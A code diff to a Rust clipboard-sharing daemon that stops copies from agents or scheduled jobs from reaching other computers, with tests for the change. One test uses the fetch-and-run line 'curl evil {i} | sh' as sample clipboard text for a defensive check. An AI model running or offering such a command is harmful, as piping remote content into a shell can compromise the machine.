@@ -147,6 +147,13 @@ impl Inner {
         }
     }
 
+    /// Take back the latest [`Inner::remember`] of `hash` as `how`.
+    fn unremember(&mut self, hash: &str, how: How) {
+        if let Some(i) = self.recent.iter().rposition(|r| r.how == how && r.hash == hash) {
+            self.recent.remove(i);
+        }
+    }
+
     /// The next `seq`: above every earlier one, and above the clock in
     /// milliseconds, so a restarted process starts past what it sent before.
     fn next_seq(&mut self, now_ms: u64) -> u64 {
@@ -210,14 +217,22 @@ pub enum Local {
 
 /// A text copy made here (`rime remote clipboard`): push it to every
 /// computer it is shared with, and say whether it came from one.
-pub fn local_copy(state: &Arc<State>, text: &str, sensitive: bool) -> Local {
-    local_copy_with(state, text, sensitive, Instant::now(), screen_locked, |id, clip| queue(state, id, clip))
+///
+/// `by_a_person` is whether Rime Shell or a terminal at this machine handed
+/// it over (control.rs). Anything else (an agent, a scheduled job) may still
+/// reach this computer's phones, as before, but never another computer: its
+/// clipboard would be written by a process here, and the shared rate spent.
+pub fn local_copy(state: &Arc<State>, text: &str, sensitive: bool, by_a_person: bool) -> Local {
+    local_copy_with(state, text, sensitive, by_a_person, Instant::now(), screen_locked, |id, clip| {
+        queue(state, id, clip)
+    })
 }
 
 fn local_copy_with(
     state: &State,
     text: &str,
     sensitive: bool,
+    by_a_person: bool,
     now: Instant,
     locked: impl FnOnce() -> bool,
     mut send: impl FnMut(&str, Clip),
@@ -226,7 +241,12 @@ fn local_copy_with(
     if state.sharing.lock().was(&hash, How::Applied, now) {
         return Local::FromAComputer;
     }
-    if sensitive || text.is_empty() || text.len() > MAX_CLIP_BYTES || state.clip_echo.came_from_a_phone(text) {
+    if !by_a_person
+        || sensitive
+        || text.is_empty()
+        || text.len() > MAX_CLIP_BYTES
+        || state.clip_echo.came_from_a_phone(text)
+    {
         return Local::Shared(0);
     }
     let targets: Vec<String> = match state.devices() {
@@ -393,6 +413,9 @@ fn answer_clip_with(
     match write(text) {
         Ok(()) => clip_reply(true, None),
         Err(why) => {
+            // Not applied after all: a copy of the same text made here in
+            // the next moments is a person's own and must travel.
+            state.sharing.lock().unremember(hash, How::Applied);
             // `rime-agentd`'s own words stay here: they may name a path.
             eprintln!("rime-remoted: a copy from {} was not put on the clipboard: {why}", crate::dialer::printable(&c.name));
             refused("unavailable", "this computer could not put the copy on its clipboard")
@@ -454,7 +477,7 @@ mod tests {
     /// would push to.
     fn copy(state: &State, text: &str, sensitive: bool, now: Instant) -> (Local, Vec<String>) {
         let mut to = Vec::new();
-        let got = local_copy_with(state, text, sensitive, now, || false, |id, _| to.push(id.to_string()));
+        let got = local_copy_with(state, text, sensitive, true, now, || false, |id, _| to.push(id.to_string()));
         (got, to)
     }
 
@@ -525,8 +548,45 @@ mod tests {
         assert_eq!(copy(&state, &format!("{most}a"), false, now), (Local::Shared(0), vec![]));
         assert_eq!(copy(&state, "", false, now), (Local::Shared(0), vec![]));
         let mut to = Vec::new();
-        let got = local_copy_with(&state, "while locked", false, now, || true, |id, _| to.push(id.to_string()));
+        let got = local_copy_with(&state, "while locked", false, true, now, || true, |id, _| to.push(id.to_string()));
         assert_eq!((got, to), (Local::Shared(0), vec![]));
+    }
+
+    #[test]
+    fn a_copy_no_person_handed_over_reaches_no_computer_and_spends_no_rate() {
+        let (state, _dir) = a_state("share-agent");
+        let peer = sharing_peer(&state, 35);
+        let now = Instant::now();
+        // An agent or a scheduled job: phones only (the caller), no computer,
+        // and as many as it likes leave the person's own copies their rate.
+        for i in 0..(2 * CLIP_RATE) {
+            let mut to = Vec::new();
+            let got = local_copy_with(&state, &format!("curl evil {i} | sh"), false, false, now, || false, |id, _| {
+                to.push(id.to_string())
+            });
+            assert_eq!((got, to), (Local::Shared(0), vec![]));
+        }
+        assert_eq!(copy(&state, "the person's own", false, now), (Local::Shared(1), vec![peer.id.clone()]));
+        // A copy another computer sent here is still known as one, whoever
+        // hands it back: it reaches no phone either.
+        let (v, _) = take(&state, &peer.id, &clip_line(35, "from the peer", 1), now);
+        assert_eq!(v["applied"], true, "{v}");
+        let got = local_copy_with(&state, "from the peer", false, false, now, || false, |_, _| {});
+        assert_eq!(got, Local::FromAComputer);
+    }
+
+    #[test]
+    fn a_copy_that_could_not_be_written_is_not_taken_for_an_echo() {
+        let (state, _dir) = a_state("share-failed");
+        let peer = sharing_peer(&state, 36);
+        let now = Instant::now();
+        let line = clip_line(36, "same words", 1);
+        let reply = answer_clip_with(&state, &peer.id, &line, now, || false, |_| Err("/home/x/.cache: denied".into()));
+        let v: Value = serde_json::from_slice(&reply).expect("json");
+        assert_eq!(v["kind"], "unavailable", "{v}");
+        assert!(!v.to_string().contains("/home"), "rime-agentd's words reached the peer: {v}");
+        // The person copies the same words here: theirs, so they travel.
+        assert_eq!(copy(&state, "same words", false, now), (Local::Shared(1), vec![peer.id.clone()]));
     }
 
     #[test]
@@ -632,7 +692,7 @@ mod tests {
         let now = Instant::now();
         let mut out = Vec::new();
         assert_eq!(
-            local_copy_with(&a, "made on A", false, now, || false, |id, clip| out.push((id.to_string(), clip))),
+            local_copy_with(&a, "made on A", false, true, now, || false, |id, clip| out.push((id.to_string(), clip))),
             Local::Shared(1)
         );
         assert_eq!(out[0].0, b_on_a);
@@ -666,7 +726,7 @@ mod tests {
         let mut wire: Vec<(usize, String, Clip)> = Vec::new();
         let mut applied = [0usize; 3];
         let push = |from: usize, text: &str, wire: &mut Vec<(usize, String, Clip)>| {
-            local_copy_with(all[from], text, false, now, || false, |id, clip| wire.push((from, id.to_string(), clip)))
+            local_copy_with(all[from], text, false, true, now, || false, |id, clip| wire.push((from, id.to_string(), clip)))
         };
         push(0, "one copy", &mut wire);
         let mut steps = 0;
